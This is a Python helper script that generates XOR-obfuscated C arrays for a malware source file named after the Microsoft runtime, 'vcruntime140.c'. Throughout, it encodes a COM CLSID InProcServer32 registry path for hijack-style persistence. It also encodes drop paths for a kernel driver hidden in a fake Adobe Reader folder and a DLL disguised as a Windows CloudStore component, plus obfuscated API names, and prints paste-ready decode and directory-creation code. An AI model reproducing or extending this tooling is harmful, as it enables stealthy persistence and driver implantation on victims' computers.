#!/usr/bin/env python3
"""Encode CLSID registry paths and drop paths for vcruntime140.c."""

import argparse
import re
import sys

CK2 = b"9832gf2bc29_120e9hd10c))b@@!11"
CK2_LEN = 30
DEFAULT_SUFFIX = "InProcServer32"
DEFAULT_SYS_NAME = "amd64.sys"
DEFAULT_SYS_SUBDIR = "Drivers"
DEFAULT_SYS_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563\Library"
DEFAULT_DLL_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563\Library"
DEFAULT_DLL = "mmdevlib.dll"
GUID_RE = re.compile(
    r"^\{?([0-9A-Fa-f]{8})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{12})\}?$"
)


def normalize_guid(raw: str) -> str:
    m = GUID_RE.match(raw.strip())
    if not m:
        raise ValueError(f"invalid GUID: {raw!r}")
    return "{" + "-".join(part.upper() for part in m.groups()) + "}"


def normalize_win_path(path: str) -> str:
    path = path.replace("/", "\\").strip().rstrip("\\")
    if not path:
        raise ValueError("path must not be empty")
    if not all(32 <= ord(c) < 127 for c in path):
        raise ValueError(f"path must be ASCII: {path!r}")
    return path


def normalize_dll_name(name: str) -> str:
    base = name.replace("\\", "/").split("/")[-1]
    if not base or base in (".", ".."):
        raise ValueError(f"invalid DLL name: {name!r}")
    return base


def reg_path(clsid: str, suffix: str = DEFAULT_SUFFIX) -> str:
    guid = normalize_guid(clsid)
    return f"Software\\Classes\\CLSID\\{guid}\\{suffix}"


def mkdir_prefixes(drop_dir: str) -> list[str]:
    """Progressive CreateDirectoryA paths (from first three components through drop_dir)."""
    parts = normalize_win_path(drop_dir).split("\\")
    if len(parts) < 3:
        raise ValueError(
            f"drop directory needs at least three components, got: {drop_dir!r}"
        )
    return ["\\".join(parts[: i + 1]) for i in range(2, len(parts))]


def xor_encode(plain: str, *, include_nul: bool = False) -> bytes:
    data = plain.encode("ascii")
    if include_nul:
        data += b"\x00"
    return bytes(data[i] ^ CK2[i % CK2_LEN] for i in range(len(data)))


def format_c_array(enc: bytes, name: str, cols: int = 11, indent: str = "  ") -> str:
    hex_indent = indent + "    "
    lines = [f"{indent}unsigned char {name}[] = {{"]
    for i in range(0, len(enc), cols):
        chunk = enc[i : i + cols]
        hexes = ", ".join(f"0x{b:02x}" for b in chunk)
        suffix = "," if i + cols < len(enc) else ""
        lines.append(f"{hex_indent}{hexes}{suffix}")
    lines.append(f"{indent}}};")
    return "\n".join(lines)


def format_c_array_oneline(enc: bytes, name: str, indent: str = "  ") -> str:
    hexes = ", ".join(f"0x{b:02x}" for b in enc)
    return f"{indent}unsigned char {name}[] = {{{hexes}}};"


def format_c_array_dll(enc: bytes) -> str:
    """Multi-line e_dll_path layout matching vcruntime140.c."""
    cols = 11
    hex_indent = "        "
    lines = ["  unsigned char e_dll_path[] = {"]
    for i in range(0, len(enc), cols):
        chunk = enc[i : i + cols]
        hexes = ", ".join(f"0x{b:02x}" for b in chunk)
        suffix = "," if i + cols < len(enc) else ""
        lines.append(f"{hex_indent}{hexes}{suffix}")
    lines.append("  };")
    return "\n".join(lines)


def format_xd_block(
    plain: str,
    enc_name: str,
    buf_name: str,
    *,
    include_nul: bool = False,
    cols: int = 11,
    indent: str = "  ",
    expand_env: bool = False,
) -> str:
    enc = xor_encode(plain, include_nul=include_nul)
    lines = [
        f"; {plain!r} ({len(enc)} encoded bytes)",
        format_c_array(enc, enc_name, cols=cols, indent=indent),
        f"{indent}char {buf_name}[256];",
        f"{indent}xd({enc_name}, {buf_name}, {len(enc)});",
    ]
    if expand_env:
        lines.append(
            f"{indent}path_expand({buf_name}, sizeof({buf_name}), "
            "fExpandEnvironmentStringsA);"
        )
    return "\n".join(lines)


def enc_len(plain: str, *, include_nul: bool = False) -> int:
    return len(xor_encode(plain, include_nul=include_nul))


def print_section(title: str) -> None:
    print(f"; --- {title} ---")


def print_paste_array(plain: str, enc_name: str, *, include_nul: bool = False) -> None:
    enc = xor_encode(plain, include_nul=include_nul)
    print(format_c_array_oneline(enc, enc_name))


def print_mkdir_usage(
    prefixes: list[str],
    *,
    array_prefix: str,
    buf: str = "sys_dir",
    declare_buf: bool = False,
) -> None:
    if declare_buf:
        print(f"  char {buf}[256];")
        print()
    for idx, prefix in enumerate(prefixes, start=1):
        name = f"{array_prefix}{idx}"
        n = enc_len(prefix)
        print(f"  xd({name}, {buf}, {n});")
        print(f"  path_expand({buf}, sizeof({buf}), fExpandEnvironmentStringsA);")
        print(f"  fCreateDirectoryA({buf}, NULL);")
        print()


def print_sys_dir_usage(sys_dir: str) -> None:
    n = enc_len(sys_dir)
    print(f"  xd(e_sys_dir, sys_dir, {n});")
    print("  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);")
    print("  fCreateDirectoryA(sys_dir, NULL);")
    print()


def print_sys_path_usage(sys_path: str) -> None:
    n = enc_len(sys_path)
    print("  char sys_path[256];")
    print(f"  xd(e_sys_path, sys_path, {n});")
    print("  path_expand(sys_path, sizeof(sys_path), fExpandEnvironmentStringsA);")
    print()


def print_dll_paste(dll_path: str) -> None:
    enc = xor_encode(dll_path)
    n = len(enc)
    print(f"  #define DLL_PATH_LEN {n}")
    print(format_c_array_dll(enc))
    print("  char dll_path[256];")
    print("  xd(e_dll_path, dll_path, DLL_PATH_LEN);")
    print("  path_expand(dll_path, sizeof(dll_path), fExpandEnvironmentStringsA);")
    print()


def print_reg_usage(clsid: str, suffix: str) -> None:
    n = enc_len(reg_path(clsid, suffix))
    print("  char reg_key[256];")
    print("  memset(reg_key, 0, sizeof(reg_key));")
    print(f"  xd(e_reg_key, reg_key, {n});")
    print()


def print_paste_sys(drop_dir: str, sys_name: str, sys_subdir: str) -> None:
    """Adobe-style .sys drop: e_dir1..N, e_sys_dir, e_sys_path (paste into vcruntime140.c)."""
    drop_dir = normalize_win_path(drop_dir)
    prefixes = mkdir_prefixes(drop_dir)
    sys_dir_path = f"{drop_dir}\\{sys_subdir}"
    sys_path = f"{sys_dir_path}\\{sys_name}"

    for idx, prefix in enumerate(prefixes, start=1):
        print_paste_array(prefix, f"e_dir{idx}")

    print_paste_array(sys_dir_path, "e_sys_dir")
    print_paste_array(sys_path, "e_sys_path")

    print_mkdir_usage(prefixes, array_prefix="e_dir", declare_buf=True)
    print_sys_dir_usage(sys_dir_path)
    print_sys_path_usage(sys_path)


def print_paste_dll(drop_dir: str, dll_name: str) -> None:
    """DLL-only drop: e_dll_dir1..N + e_dll_path (after .sys block; reuses sys_dir)."""
    drop_dir = normalize_win_path(drop_dir)
    prefixes = mkdir_prefixes(drop_dir)
    dll_path = f"{drop_dir}\\{normalize_dll_name(dll_name)}"

    for idx, prefix in enumerate(prefixes, start=1):
        print_paste_array(prefix, f"e_dll_dir{idx}")

    print_mkdir_usage(
        prefixes,
        array_prefix="e_dll_dir",
        declare_buf=False,
    )
    print_dll_paste(dll_path)


def print_reg_paste(clsid: str, suffix: str) -> None:
    path = reg_path(clsid, suffix)
    print_paste_array(path, "e_reg_key")
    print_reg_usage(clsid, suffix)


def print_api_blob(api_name: str) -> None:
    enc = xor_encode(api_name)
    var = "e_" + api_name
    print(format_c_array_oneline(enc, var))
    print()


def print_reg_block(clsid: str, suffix: str) -> None:
    path = reg_path(clsid, suffix)
    print("; --- registry key ---")
    print(format_xd_block(path, "e_reg_key", "reg_key"))
    print()


def print_dll_block(drop_dir: str, dll_name: str) -> None:
    dll_path = f"{normalize_win_path(drop_dir)}\\{normalize_dll_name(dll_name)}"
    print("; --- DLL drop path ---")
    print(f"; RegSetValueExA uses slen(dll_path) + 1 after path_expand")
    enc = xor_encode(dll_path)
    print(f"  #define DLL_PATH_LEN {len(enc)}")
    print(format_c_array(enc, "e_dll_path"))
    print("  char dll_path[256];")
    print("  xd(e_dll_path, dll_path, DLL_PATH_LEN);")
    print("  path_expand(dll_path, sizeof(dll_path), fExpandEnvironmentStringsA);")
    print()


def print_dir_bundle(
    drop_dir: str,
    sys_name: str,
    sys_subdir: str,
    *,
    include_sys: bool = True,
) -> None:
    drop_dir = normalize_win_path(drop_dir)
    sys_dir_path = f"{drop_dir}\\{sys_subdir}"
    sys_path = f"{sys_dir_path}\\{sys_name}"
    prefixes = mkdir_prefixes(drop_dir)

    for idx, prefix in enumerate(prefixes, start=1):
        enc = xor_encode(prefix)
        print(f"; e_dir{idx}: {prefix!r}")
        print(format_c_array(enc, f"e_dir{idx}"))
        print(f"  xd(e_dir{idx}, sys_dir, {len(enc)});")
        print(
            "  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);"
        )
        print("  fCreateDirectoryA(sys_dir, NULL);")
        print()

    if not include_sys:
        return

    print("; --- driver drop path ---")
    print(format_xd_block(sys_dir_path, "e_sys_dir", "sys_dir", expand_env=True))
    print("  fCreateDirectoryA(sys_dir, NULL);")
    print()
    print(format_xd_block(sys_path, "e_sys_path", "sys_path", expand_env=True))
    print()


def resolve_paths(args: argparse.Namespace) -> tuple[str | None, str | None, bool]:
    """Return (sys_dir, dll_dir, include_sys_paths_under_sys_dir)."""
    legacy_dir = normalize_win_path(args.drop_dir) if args.drop_dir else None
    sys_dir = normalize_win_path(args.sys_dir) if args.sys_dir else None
    dll_dir = normalize_win_path(args.dll_dir) if args.dll_dir else None

    if legacy_dir:
        if args.full:
            sys_dir = sys_dir or legacy_dir
        if args.dll:
            dll_dir = dll_dir or legacy_dir

    include_sys = args.full and sys_dir is not None
    return sys_dir, dll_dir, include_sys


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "XOR-encode vcruntime140.c path blobs. "
            ".sys and .dll can use different directories (--sys-dir vs --dll-dir)."
        )
    )
    parser.add_argument(
        "clsid",
        nargs="?",
        help='CLSID/GUID, e.g. "{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}"',
    )
    parser.add_argument(
        "-d",
        "--dir",
        dest="drop_dir",
        metavar="DIR",
        help="Legacy: with --full sets sys dir; with --dll sets dll dir",
    )
    parser.add_argument(
        "--sys-dir",
        metavar="DIR",
        help=f".sys driver tree root (default with --full only: {DEFAULT_SYS_DIR})",
    )
    parser.add_argument(
        "--dll-dir",
        metavar="DIR",
        help="DLL drop directory (e.g. %%LOCALAPPDATA%%\\...\\CloudStore\\Shell)",
    )
    parser.add_argument(
        "--dll",
        metavar="NAME",
        help=f'DLL filename under --dll-dir (default: {DEFAULT_DLL})',
    )
    parser.add_argument(
        "--suffix",
        default=DEFAULT_SUFFIX,
        help=f"Registry key suffix (default: {DEFAULT_SUFFIX})",
    )
    parser.add_argument(
        "--sys",
        default=DEFAULT_SYS_NAME,
        help=f".sys filename under --sys-subdir (default: {DEFAULT_SYS_NAME})",
    )
    parser.add_argument(
        "--sys-subdir",
        default=DEFAULT_SYS_SUBDIR,
        help=f"Subdir under --sys-dir for .sys (default: {DEFAULT_SYS_SUBDIR})",
    )
    parser.add_argument(
        "--full",
        action="store_true",
        help="Emit .sys blobs (e_dir*, e_sys_dir, e_sys_path) for --sys-dir or -d",
    )
    parser.add_argument(
        "--with-code",
        action="store_true",
        help="Verbose output with comments (default when clsid is given)",
    )
    parser.add_argument(
        "--bytes-only",
        action="store_true",
        help="Paste-ready output (default when clsid is omitted)",
    )
    parser.add_argument(
        "--api",
        metavar="NAME",
        help="XOR-encoded API name, e.g. ExpandEnvironmentStringsA",
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Print decoded paths to stderr",
    )
    parser.epilog = (
        "examples:\n"
        "  # DLL only (CloudStore Shell) — paste after .sys block in vcruntime140.c\n"
        '  python3 getCLSID.py --dll-dir "%LOCALAPPDATA%\\Microsoft\\Windows\\CloudStore\\Shell" \\\n'
        '    --dll "Windows.CloudStore.Schema.Shell.dll"\n'
        "\n"
        "  # .sys only (Adobe) — keep existing block or regenerate\n"
        f'  python3 getCLSID.py --sys-dir "{DEFAULT_SYS_DIR}" --full\n'
        "\n"
        "  # Both dirs in one run\n"
        f'  python3 getCLSID.py --sys-dir "{DEFAULT_SYS_DIR}" --full \\\n'
        '    --dll-dir "%LOCALAPPDATA%\\...\\Shell" --dll "Windows.CloudStore.Schema.Shell.dll"\n'
        "\n"
        '  python3 getCLSID.py "{GUID}" --dll-dir "%LOCALAPPDATA%\\...\\Shell" \\\n'
        '    --dll "Windows.CloudStore.Schema.Shell.dll"\n'
    )
    parser.formatter_class = argparse.RawDescriptionHelpFormatter
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if args.api:
        print_api_blob(args.api)
        return 0

    path_only = args.clsid is None
    bytes_only = args.bytes_only or path_only
    with_code = args.with_code or not path_only

    if path_only and not args.drop_dir and not args.sys_dir and not args.dll_dir:
        if not args.dll:
            parser.error("need clsid, --sys-dir, --dll-dir, and/or -d with --dll/--full")

    if not path_only and args.drop_dir and not args.dll:
        parser.error("--dll is required when -d/--dir is set with a clsid")

    try:
        dll_name = normalize_dll_name(args.dll) if args.dll else None
        sys_dir, dll_dir, include_sys = resolve_paths(args)

        if dll_name and not dll_dir:
            dll_dir = DEFAULT_DLL_DIR

        paste = bytes_only and not with_code

        if paste:
            if sys_dir and include_sys:
                print_section(".sys drop")
                print_paste_sys(sys_dir, args.sys, args.sys_subdir)
                print()
            if dll_dir and dll_name:
                print_section("DLL drop (uses e_dll_dir*; paste after .sys block)")
                print_paste_dll(dll_dir, dll_name)
        else:
            if sys_dir and include_sys:
                print_dir_bundle(
                    sys_dir, args.sys, args.sys_subdir, include_sys=True
                )
            if dll_dir and dll_name:
                print_dll_block(dll_dir, dll_name)

        if args.clsid:
            if paste:
                print_section("registry")
                print_reg_paste(args.clsid, args.suffix)
            else:
                print_reg_block(args.clsid, args.suffix)

        if args.verify:
            verify_paths: list[tuple[str, str]] = []
            if args.clsid:
                verify_paths.append(("reg", reg_path(args.clsid, args.suffix)))
            if dll_dir and dll_name:
                verify_paths.append(("dll", f"{dll_dir}\\{dll_name}"))
            if sys_dir and include_sys:
                sd = f"{sys_dir}\\{args.sys_subdir}"
                verify_paths.extend(
                    [
                        ("sys_dir", sd),
                        ("sys", f"{sd}\\{args.sys}"),
                    ]
                )
                verify_paths.extend(
                    (f"dir{i}", p)
                    for i, p in enumerate(mkdir_prefixes(sys_dir), start=1)
                )
            if dll_dir and dll_name:
                verify_paths.extend(
                    (f"dll_dir{i}", p)
                    for i, p in enumerate(mkdir_prefixes(dll_dir), start=1)
                )
            for label, path in verify_paths:
                print(f"; verify {label}: {path!r}", file=sys.stderr)

    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
